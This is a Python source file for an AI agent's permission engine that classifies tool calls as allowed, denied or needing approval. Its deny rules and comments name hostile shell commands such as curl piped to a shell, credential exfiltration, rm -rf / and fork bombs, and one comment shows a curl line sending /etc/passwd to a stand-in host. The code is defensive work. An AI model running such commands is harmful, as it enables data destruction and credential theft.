"""Policy and permission engine.

Deterministic security controls live here, never in prompt text. A model can be
talked out of an instruction; it cannot be talked out of a Python `if`.

The engine answers one question per tool call: given this tool, these
arguments, and this autonomy level, is the call ALLOWED, DENIED, or does it
need explicit human confirmation (ASK)?

Layers, in order of precedence:
1. Hard denials      - never allowed at any autonomy level (destructive rm,
                       force-push to protected branches, writes outside root).
2. Injection floor   - content flagged as untrusted cannot escalate privilege.
3. Secret redaction  - detected credentials are stripped before logging.
4. Autonomy policy   - read-only / ask / auto / yolo gate for everything else.
"""

from __future__ import annotations

import fnmatch
import os
import posixpath
import re
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path


class Decision(str, Enum):
    ALLOW = "allow"
    ASK = "ask"
    DENY = "deny"


class Autonomy(str, Enum):
    """How much the agent may do without asking.

    READ_ONLY - inspect only; every mutating tool asks.
    ASK       - default; mutating tools ask, read tools pass.
    AUTO      - safe mutating tools pass, destructive ones ask.
    YOLO      - everything except hard denials passes. Still denies hard rules.
    """

    READ_ONLY = "read-only"
    ASK = "ask"
    AUTO = "auto"
    YOLO = "yolo"


@dataclass(frozen=True)
class Verdict:
    decision: Decision
    reason: str
    rule: str = ""
    # Present only when the call's arguments contained a credential. An ASK
    # verdict is shown to a human and often logged; both need the arguments
    # without the secret. Populated by `evaluate`, never by hand.
    redacted_args: dict | None = None

    def to_dict(self) -> dict:
        out = {"decision": self.decision.value, "reason": self.reason, "rule": self.rule}
        if self.redacted_args is not None:
            out["redacted_args"] = self.redacted_args
        return out


# Tools that only read. Everything not listed is treated as mutating.
READ_ONLY_TOOLS = {
    "Read", "Glob", "Grep", "WebFetch", "WebSearch", "LS", "NotebookRead",
    "TodoWrite", "TodoRead", "list_files", "read_file", "search_files",
}

# Tools that mutate the filesystem or run code.
MUTATING_TOOLS = {
    "Write", "Edit", "MultiEdit", "NotebookEdit", "Bash", "execute_command",
    "run_shell_command", "run_kali_tool", "Task", "Agent",
}

# Every tool name the evaluator has an opinion about. The CLI uses this to tell
# a tool name from a bare shell command, so it must stay the union of the two
# sets above rather than a third hand-maintained list.
KNOWN_TOOLS = READ_ONLY_TOOLS | MUTATING_TOOLS

# Commands that are read-only even though they run through Bash.
#
# This list is an allowlist, so it is only as safe as its weakest member. Two
# rules keep it honest:
#
#   * `find` is not read-only. `find / -delete` and `find . -exec rm` destroy
#     a tree while starting with an allowlisted word, so the fast path below
#     rejects any command that carries a delete verb, -exec, -delete or a pipe.
#   * The fast path matches the *whole* command, not a prefix. `ls; rm -rf /`
#     begins with `ls`, and a prefix match let the second half through.
_READONLY_COMMANDS = re.compile(
    r"^\s*(ls|cat|head|tail|grep|rg|find|fd|wc|stat|file|which|whoami|pwd|"
    r"git\s+(status|log|diff|show|branch|remote|describe)|"
    r"python3?\s+--version|node\s+--version|npm\s+(ls|list)|pip\s+(list|show)|"
    r"df|du|free|uname|date|echo|env|printenv|id|ps|ss|netstat)\b", re.I)

# Anything here means the command is not a pure read, whatever it starts with.
# Newline and carriage return are in the list because a shell treats them as
# command separators: `ls\ncurl http://evil -d @/etc/passwd` is two commands,
# and without \n in this pattern the first word `ls` made the whole thing pass
# as a read.
_NOT_READONLY = re.compile(
    r"(?:[;\n\r]|&&|\|\||\||`|\$\(|>\s*\S|<\()"      # chaining, pipes, redirects
    r"|\s-(?:exec|delete|execdir|ok|okdir)\b"        # find's destructive flags
    r"|\b(?:rm|mv|cp|dd|shred|truncate|tee|xargs|chmod|chown|kill|pkill)\b",
    re.I)


def _is_readonly_command(command: str) -> bool:
    """True only for a single, un-chained, non-destructive read command.

    A read of a protected path is not a free read: `cat /etc/shadow` starts
    with an allowlisted verb but exfiltrates the file the protected-path list
    exists to guard, so it is excluded from the fast path.
    """
    if _NOT_READONLY.search(command):
        return False
    if not _READONLY_COMMANDS.match(command):
        return False
    for token in command.split():
        candidate = token.strip("'\"")
        if candidate.startswith("/") or candidate.startswith("~"):
            if _is_protected_path(candidate):
                return False
    return True

# Hard denials: matched against a shell command. These fire at every autonomy
# level including YOLO, because a wrong answer here is unrecoverable.
#
# Every pattern is compiled with re.IGNORECASE. `RM -RF /` is the same command
# as `rm -rf /` to a shell, so a case-sensitive table is a one-keystroke bypass.
#
# The rm patterns are deliberately written against a normalised view of the
# command (see `_normalise_command`) rather than raw text: flag bundling
# (`-rf`, `-fr`, `-r -f`, `--recursive --force`), `..` segments and brace
# expansion are all ways to spell the same thing, and a table that only knows
# one spelling is a table of suggestions.
_HARD_DENY_COMMANDS: list[tuple[str, re.Pattern[str]]] = [
    ("disk-overwrite", re.compile(r"\bdd\b.*\bof=/dev/(sd|nvme|hd|vd)", re.IGNORECASE)),
    ("mkfs", re.compile(r"\bmkfs(\.\w+)?\s+/dev/", re.IGNORECASE)),
    ("fork-bomb", re.compile(r":\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:")),
    ("history-rewrite", re.compile(r"\bgit\s+push\b.*\s(--force|-f)\b.*\b(main|master|release|prod)\b", re.IGNORECASE)),
    ("history-rewrite", re.compile(r"\bgit\s+filter-(branch|repo)\b", re.IGNORECASE)),
    # `reset --hard` discards uncommitted work with no recovery path. It is not
    # an approval question: the answer has to be "commit or stash first".
    ("history-rewrite", re.compile(r"\bgit\s+reset\s+--hard\b", re.IGNORECASE)),
    ("history-rewrite", re.compile(r"\bgit\s+clean\s+-[a-zA-Z]*[fdx]", re.IGNORECASE)),
    ("credential-exfil", re.compile(r"\b(curl|wget)\b[^|;]*\b(\.ssh/id_|\.aws/credentials|\.env\b|id_rsa)", re.IGNORECASE)),
    # `curl ... | sh`, and the equivalents that never use a pipe: process
    # substitution and command substitution both feed remote bytes to a shell.
    ("pipe-to-shell", re.compile(r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|k)?sh\b", re.IGNORECASE)),
    ("pipe-to-shell", re.compile(r"\b(ba|z|k)?sh\s+<\s*\(\s*(curl|wget)\b", re.IGNORECASE)),
    ("pipe-to-shell", re.compile(r"\bsource\s+<\s*\(\s*(curl|wget)\b", re.IGNORECASE)),
    ("pipe-to-shell", re.compile(r"\beval\b.*\$\s*\(\s*(curl|wget)\b", re.IGNORECASE)),
    # Download then run: the two halves may be joined by && or ; rather than a
    # pipe, which is the same trust decision with different punctuation.
    ("pipe-to-shell", re.compile(
        r"\b(curl|wget)\b[^|;&]*\b(ba|z|k)?sh\s+\S+\s*[;&]|[;&]\s*(ba|z|k)?sh\s+\S+",
        re.IGNORECASE)),
    ("permission-nuke", re.compile(r"\bchmod\s+-R\s+777\s+/(?!\w)", re.IGNORECASE)),
    ("sudo-anything", re.compile(r"\bsudo\s+", re.IGNORECASE)),
]

# Commands that delete without the word `rm` in them. These are matched on the
# whole command and are hard denials when their target is catastrophic.
_DELETE_ALIASES: list[tuple[str, re.Pattern[str]]] = [
    # find / -delete and find / -exec rm ... both destroy a tree in place.
    ("root-delete", re.compile(r"\bfind\b.*\s-delete\b", re.IGNORECASE)),
    ("root-delete", re.compile(r"\bfind\b.*\s-exec\s+(rm|shred|truncate)\b", re.IGNORECASE)),
    # xargs forwarding a destructive verb to whatever it reads.
    ("root-delete", re.compile(r"\bxargs\b.*\b(rm|shred|truncate)\b", re.IGNORECASE)),
]

# Targets that make a delete catastrophic regardless of how it was spelled.
_CATASTROPHIC_TARGETS = {
    "/", "/*", "~", "~/*", "$HOME", "${HOME}", "$HOME/*", "${HOME}/*",
}

# Parameter-expansion forms that mean "home": ${HOME}, ${HOME:?}, ${HOME:-x},
# ${HOME:=x}. The `:?` guard form is what a careful shell script writes, and it
# was not recognised at all, so it deleted the home directory without a denial.
_HOME_EXPANSION = re.compile(r"\$\{home(?::[-=+?][^}]*)?\}", re.IGNORECASE)

# Absolute sentinel substituted for the home root while folding `..` segments.
# It has to be absolute: normpath on a relative sentinel turns `~/..` into `.`,
# which then reads as an ordinary relative path and escapes the target check.
_HOME_SENTINEL = "/\x00home"


def _normalise_command(command: str) -> str:
    """Fold the spellings a shell treats as identical into one form.

    Lowercases, folds every home expansion to `$home`, collapses whitespace and
    resolves `..` segments so `rm -rf /tmp/../` and `rm -rf /` compare equal.
    This is normalisation for matching only; nothing is executed.
    """
    text = command.lower()
    # Fold `${HOME}`, `${HOME:?}` and friends before the generic brace pass,
    # otherwise `${HOME:?}` survives as a token no target set contains.
    text = _HOME_EXPANSION.sub("$home", text)
    text = re.sub(r"\$\{(\w+)\}", r"$\1", text)
    text = re.sub(r"\s+", " ", text).strip()

    def _fold(match: re.Match[str]) -> str:
        token = match.group(0)
        # `~` and `$home` are roots, and normpath on a *relative* sentinel
        # collapses `~/..` to `.`, which reads as an ordinary relative path.
        # An absolute sentinel keeps the root anchored: `~/..` folds to `/`,
        # which is already a catastrophic target, and `~/foo/..` folds back to
        # home. The sentinel is substituted back afterwards so the target
        # comparison still sees a home path.
        is_home = token.startswith("~") or token.startswith("$home")
        if is_home:
            prefix = 1 if token.startswith("~") else 5
            guarded = _HOME_SENTINEL + token[prefix:]
        else:
            guarded = token
        folded = posixpath.normpath(guarded)
        if is_home:
            folded = folded.replace(_HOME_SENTINEL, "~")
        return folded if folded else token

    return re.sub(r"(?<![\w.-])(/|~/|\$home)[\w./~-]*", _fold, text)


def _rm_targets(command: str) -> list[str]:
    """Return the operands of every rm in the command, flags stripped.

    Splits on shell separators so `ls; rm -rf /` is examined as two commands,
    then collects non-flag words after each `rm`. The verb is matched on its
    basename and with quotes stripped, because `/bin/rm -rf /` and
    `sh -c 'rm -rf /'` run the same delete as `rm -rf /`.
    """
    targets: list[str] = []
    for segment in re.split(r"[;&|]+|\$\(|\)", command):
        words = [w.strip("'\"") for w in segment.split()]
        for index, word in enumerate(words):
            if posixpath.basename(word) != "rm":
                continue
            for operand in words[index + 1:]:
                if operand.startswith("-"):
                    continue
                targets.append(operand)
    return targets


def _is_catastrophic_rm(command: str) -> bool:
    """True when any rm in the command targets root or the home directory."""
    if not re.search(r"\brm\b", command, re.IGNORECASE):
        return False
    for target in _rm_targets(_normalise_command(command)):
        cleaned = target.rstrip("/*")
        # `~` is the home directory and `~/.` / `~/..` both resolve to it, so a
        # target that folds back to a bare home marker is catastrophic even
        # though it does not literally appear in _CATASTROPHIC_TARGETS.
        if target in _CATASTROPHIC_TARGETS or cleaned in ("/", "~", "$home", "${home}"):
            return True
        if cleaned in ("/", ""):
            return True
    return False

# Paths that must never be written, even under YOLO.
_PROTECTED_PATH_PATTERNS = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers", "~/.ssh/*", "~/.aws/*",
    "~/.config/gh/*", "**/.git/config", "/boot/*", "/dev/sd*",
]

_SECRET_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("openai_key", re.compile(r"\bsk-[A-Za-z0-9]{20,}\b")),
    ("anthropic_key", re.compile(r"\bsk-ant-[A-Za-z0-9_-]{20,}\b")),
    # Fine-grained PATs carry underscores and a longer body than classic ones,
    # so the `gh[pousr]_[A-Za-z0-9]{30,}` shape misses them entirely.
    ("github_token", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{30,}\b")),
    ("github_pat", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{20,}\b")),
    ("aws_key", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    # The AWS secret half never starts with AKIA; it is the value after the
    # assignment, so it needs its own shape or it leaks next to a redacted key.
    ("aws_secret", re.compile(
        r"\baws_?secret_?access_?key\b\s*[:=]\s*['\"]?([A-Za-z0-9/+=]{30,})", re.I)),
    ("slack_token", re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b")),
    ("stripe_key", re.compile(r"\b[sr]k_(live|test)_[A-Za-z0-9]{20,}\b")),
    ("google_api_key", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("npm_token", re.compile(r"\bnpm_[A-Za-z0-9]{36}\b")),
    ("private_key", re.compile(r"-----BEGIN (RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----")),
    ("jwt", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")),
    ("generic_assignment", re.compile(
        r"\b(api[_-]?key|secret|password|passwd|token|bearer)\s*[:=]\s*['\"]?([A-Za-z0-9_\-./+]{12,})", re.I)),
]

_PEM_BLOCK = re.compile(
    r"-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----", re.S)


def redact_secrets(text: str) -> tuple[str, list[str]]:
    """Replace detected credentials with [REDACTED:kind]. Returns (text, kinds)."""
    if not isinstance(text, str):
        return text, []
    kinds: list[str] = []
    out = _PEM_BLOCK.sub("[REDACTED:private_key]", text)
    if out != text:
        kinds.append("private_key")
    for name, pattern in _SECRET_PATTERNS:
        if name == "private_key":
            continue
        def _sub(match: re.Match) -> str:
            kinds.append(name)
            if match.lastindex and match.lastindex >= 2:
                return match.group(0).replace(match.group(2), "[REDACTED]")
            return "[REDACTED]"
        out = pattern.sub(_sub, out)
    return out, sorted(set(kinds))


def contains_secret(text: str) -> bool:
    return bool(redact_secrets(text)[1])


def _within(root: Path, candidate: Path) -> bool:
    """True when `candidate` is inside `root`.

    Both sides are resolved before comparison, so a relative root is measured
    against the current directory rather than the process's idea of the path.
    `check_path` resolves the candidate's parent directory first, because a
    file that does not exist yet cannot be resolved itself.
    """
    try:
        candidate.resolve().relative_to(root.resolve())
        return True
    except (ValueError, OSError):
        return False


def _is_protected_path(path_str: str) -> bool:
    """True when the path names a protected file, however it is spelled.

    The path is normalised first. `/etc//passwd`, `/etc/./passwd` and
    `/etc/../etc/passwd` are the same file as `/etc/passwd`, and a check that
    compares raw strings lets all three through.
    """
    expanded = os.path.expanduser(path_str)
    normalised = posixpath.normpath(expanded)
    for pattern in _PROTECTED_PATH_PATTERNS:
        pattern_expanded = os.path.expanduser(pattern)
        if fnmatch.fnmatch(expanded, pattern_expanded):
            return True
        if fnmatch.fnmatch(normalised, pattern_expanded):
            return True
        if pattern.startswith("/") and (
                expanded.startswith(pattern.rstrip("*"))
                or normalised.startswith(pattern.rstrip("*"))):
            return True
    return False


def check_command(command: str, autonomy: Autonomy = Autonomy.ASK) -> Verdict:
    """Apply the hard-deny table and the read-only fast path to a shell command."""
    if not isinstance(command, str):
        return Verdict(Decision.DENY, "command is not a string", "invalid-input")

    # Nothing to run is nothing to approve. Without this, an empty command falls
    # through to the autonomy band and asks the user to approve a no-op.
    if not command.strip():
        return Verdict(Decision.ALLOW, "empty command is a no-op", "empty-command")

    for name, pattern in _HARD_DENY_COMMANDS:
        match = pattern.search(command)
        if match:
            return Verdict(Decision.DENY,
                           f"hard denial {name!r}: {match.group(0)[:80]!r} is never allowed",
                           f"hard-deny:{name}")

    # Deleting root or $HOME is a hard denial however it is spelled. This is a
    # separate pass because it needs the operand list, not a single regex: the
    # flags may be bundled, split, spelled long, or separated from the target
    # by `..` segments, and each of those used to be an allow.
    if _is_catastrophic_rm(command):
        return Verdict(Decision.DENY,
                       "hard denial 'root-delete': deleting the filesystem root "
                       "or the home directory is never allowed",
                       "hard-deny:root-delete")

    for name, pattern in _DELETE_ALIASES:
        match = pattern.search(command)
        if match:
            return Verdict(Decision.DENY,
                           f"hard denial {name!r}: {match.group(0)[:80]!r} deletes a tree",
                           f"hard-deny:{name}")

    if _is_readonly_command(command):
        return Verdict(Decision.ALLOW, "read-only command", "readonly-command")

    if autonomy is Autonomy.READ_ONLY:
        return Verdict(Decision.ASK, "read-only autonomy: mutating command needs approval",
                       "autonomy:read-only")
    if autonomy is Autonomy.YOLO:
        return Verdict(Decision.ALLOW, "yolo autonomy", "autonomy:yolo")
    if autonomy is Autonomy.AUTO:
        return Verdict(Decision.ALLOW, "auto autonomy: non-destructive command", "autonomy:auto")
    return Verdict(Decision.ASK, "ask autonomy: command needs approval", "autonomy:ask")


def check_path(path_str: str, root: Path | None, write: bool = True) -> Verdict:
    """Enforce workspace containment and protected-path rules."""
    if not isinstance(path_str, str) or not path_str:
        return Verdict(Decision.DENY, "empty or non-string path", "invalid-input")
    if "\x00" in path_str:
        return Verdict(Decision.DENY, "null byte in path", "path-traversal")
    if _is_protected_path(path_str):
        return Verdict(Decision.DENY, f"protected path {path_str!r}", "protected-path")
    if write and root is not None:
        if not _within(root, Path(os.path.expanduser(path_str))):
            return Verdict(Decision.DENY,
                           f"write outside workspace root {root}: {path_str!r}",
                           "workspace-containment")
    return Verdict(Decision.ALLOW, "path allowed", "path-ok")


# Every name a shell can be reached through, including the MCP-namespaced
# spellings (`mcp__kali-toolbox__run_shell_command`) that every real MCP tool
# uses. Matching the bare names only meant an MCP tool fell through to the
# unknown-tool branch and was ALLOWED under yolo with no hard-deny check.
_SHELL_TOOL_NAMES = {
    "Bash", "bash", "execute_command", "run_shell_command", "run_kali_tool",
    "execute_bash", "shell", "run_command", "run_terminal_cmd",
}

_MCP_PREFIX = re.compile(r"^mcp__[A-Za-z0-9_.-]+__")


def _base_tool_name(tool_name: str) -> str:
    """Strip an MCP server prefix, leaving the tool's own name.

    `mcp__kali-toolbox__run_shell_command` is `run_shell_command` reached
    through a server. The security question is the same, so the policy engine
    must see the same name.
    """
    return _MCP_PREFIX.sub("", tool_name)


def _coerce_autonomy(autonomy: Autonomy | str) -> Autonomy:
    """Accept the enum or its string form; raise on anything else.

    `Autonomy` is a str enum, so `"read-only"` compares equal to
    `Autonomy.READ_ONLY` but is not *identical* to it. Every branch here used
    `is`, so a caller passing the string form (a JSON config, a hook payload)
    silently fell through to the final ALLOW. Coerce once, at the door.
    """
    if isinstance(autonomy, Autonomy):
        return autonomy
    try:
        return Autonomy(autonomy)
    except ValueError as exc:
        raise ValueError(f"unknown autonomy level {autonomy!r}; "
                         f"expected one of {[a.value for a in Autonomy]}") from exc


def evaluate(tool_name: str, args: dict, autonomy: Autonomy | str = Autonomy.ASK,
             root: Path | None = None, untrusted: bool = False) -> Verdict:
    """Full verdict for one tool call.

    `untrusted` marks calls whose content came from tool output or a web page.
    Untrusted content cannot escalate: it is capped at ASK even under YOLO,
    for every tool, not only the two branches that used to check it.
    """
    args = args if isinstance(args, dict) else {}
    autonomy = _coerce_autonomy(autonomy)
    return _with_redacted_args(_decide(tool_name, args, autonomy, root, untrusted), args)


def _with_redacted_args(verdict: Verdict, args: dict) -> Verdict:
    """Attach the redacted arguments to a verdict when they held a secret.

    Done once at the edge rather than in every branch, for the same reason the
    injection floor is: a branch added later must not be able to skip it.
    """
    if verdict.redacted_args is not None:
        return verdict
    redacted = _redact_arguments(args)
    if redacted is None:
        return verdict
    return Verdict(verdict.decision, verdict.reason, verdict.rule, redacted)


def _decide(tool_name: str, args: dict, autonomy: Autonomy,
            root: Path | None, untrusted: bool) -> Verdict:

    if not isinstance(tool_name, str) or not tool_name:
        return Verdict(Decision.DENY, "missing tool name", "invalid-input")

    base_name = _base_tool_name(tool_name)

    if base_name in _SHELL_TOOL_NAMES:
        command = args.get("command") or args.get("cmd") or ""
        return _apply_injection_floor(check_command(command, autonomy), untrusted)

    if base_name in {"Write", "Edit", "MultiEdit", "NotebookEdit"}:
        path = args.get("file_path") or args.get("path") or ""
        verdict = check_path(str(path), root, write=True)
        if verdict.decision is Decision.DENY:
            return verdict
        if untrusted:
            return Verdict(Decision.ASK, "untrusted content cannot write without approval",
                           "injection-floor")
        # Read-only means no mutation at all. Asking would imply "yes" is an
        # answer, which would let the level be negotiated away by one approval.
        if autonomy is Autonomy.READ_ONLY:
            return Verdict(Decision.DENY, "read-only autonomy: file writes are disabled",
                           "autonomy:read-only")
        if autonomy is Autonomy.ASK:
            return Verdict(Decision.ASK, f"{autonomy.value} autonomy: file write needs approval",
                           f"autonomy:{autonomy.value}")
        return Verdict(Decision.ALLOW, "file write allowed", "file-write-ok")

    if base_name in READ_ONLY_TOOLS:
        # A read is not automatically harmless: the protected-path list guards
        # /etc/shadow, ~/.ssh and ~/.aws against reads as well as writes, and a
        # blanket ALLOW here made the list apply to one direction only.
        path = args.get("file_path") or args.get("path") or ""
        if path:
            verdict = check_path(str(path), root, write=False)
            if verdict.decision is Decision.DENY:
                return verdict
        return _apply_injection_floor(
            Verdict(Decision.ALLOW, "read-only tool", "readonly-tool"), untrusted)

    # Unknown tools are treated as mutating: fail closed, not open.
    if autonomy is Autonomy.YOLO:
        return _apply_injection_floor(
            Verdict(Decision.ALLOW, "yolo autonomy for unknown tool", "autonomy:yolo"),
            untrusted)
    return _apply_injection_floor(
        Verdict(Decision.ASK, f"unknown tool {tool_name!r} needs approval", "unknown-tool"),
        untrusted)


def _apply_injection_floor(verdict: Verdict, untrusted: bool) -> Verdict:
    """Cap an ALLOW at ASK when the call's content is untrusted.

    Applied once, as a post-filter, so a new branch cannot forget it. A DENY is
    left alone: untrusted content cannot make a call *more* allowed.
    """
    if untrusted and verdict.decision is Decision.ALLOW:
        return Verdict(Decision.ASK, "untrusted content cannot escalate privilege",
                       "injection-floor")
    return verdict


def _redact_arguments(args: dict) -> dict | None:
    """Return a copy of `args` with credentials replaced, or None if clean.

    A verdict is the object a harness prints and a user reads, and a tool call
    routinely carries a token: `curl -H 'Authorization: Bearer ghp_...'`. The
    decision does not need the secret, so the verdict carries the redacted form
    and omits the field entirely when there was nothing to redact.
    """
    if not isinstance(args, dict):
        return None
    found = False

    def _walk(value):
        nonlocal found
        if isinstance(value, str):
            out, kinds = redact_secrets(value)
            if kinds:
                found = True
            return out
        if isinstance(value, list):
            return [_walk(item) for item in value]
        if isinstance(value, dict):
            return {key: _walk(item) for key, item in value.items()}
        return value

    redacted = {key: _walk(value) for key, value in args.items()}
    return redacted if found else None


@dataclass
class PolicyConfig:
    autonomy: Autonomy = Autonomy.ASK
    root: Path | None = None
    allow_tools: set[str] = field(default_factory=set)
    deny_tools: set[str] = field(default_factory=set)
    allow_commands: list[str] = field(default_factory=list)

    def evaluate(self, tool_name: str, args: dict, untrusted: bool = False) -> Verdict:
        # Hard denials are evaluated first and cannot be allow-listed away.
        # An allow list that short-circuits them is a config that says "trust
        # me" and then runs `rm -rf /`: the whole point of a hard denial is
        # that no configuration reaches past it.
        hard = evaluate(tool_name, args, Autonomy.READ_ONLY, self.root, untrusted=False)
        if hard.decision is Decision.DENY and hard.rule.startswith("hard-deny:"):
            return hard
        if tool_name in self.deny_tools:
            return Verdict(Decision.DENY, f"tool {tool_name!r} is on the deny list", "deny-list")
        # Both allow paths run through the injection floor. An allow list is
        # the operator trusting the *tool*; it says nothing about the *content*
        # of this particular call, which may have arrived from a web page or a
        # tool result. Skipping the floor here would make the allow list the
        # one configuration that turns untrusted content into an execution.
        if tool_name in self.allow_tools:
            return _apply_injection_floor(
                Verdict(Decision.ALLOW, f"tool {tool_name!r} is on the allow list",
                        "allow-list"), untrusted)
        command = args.get("command", "") if isinstance(args, dict) else ""
        for pattern in self.allow_commands:
            if command and fnmatch.fnmatch(command, pattern):
                return _apply_injection_floor(
                    Verdict(Decision.ALLOW, f"command matches {pattern!r}", "allow-command"),
                    untrusted)
        return evaluate(tool_name, args, self.autonomy, self.root, untrusted)

    @classmethod
    def from_dict(cls, data: dict, root: Path | None = None) -> "PolicyConfig":
        data = data if isinstance(data, dict) else {}
        try:
            autonomy = Autonomy(str(data.get("autonomy", "ask")).lower())
        except ValueError:
            autonomy = Autonomy.ASK
        return cls(
            autonomy=autonomy,
            root=root or (Path(data["root"]) if data.get("root") else None),
            allow_tools=set(data.get("allow_tools") or []),
            deny_tools=set(data.get("deny_tools") or []),
            allow_commands=list(data.get("allow_commands") or []),
        )
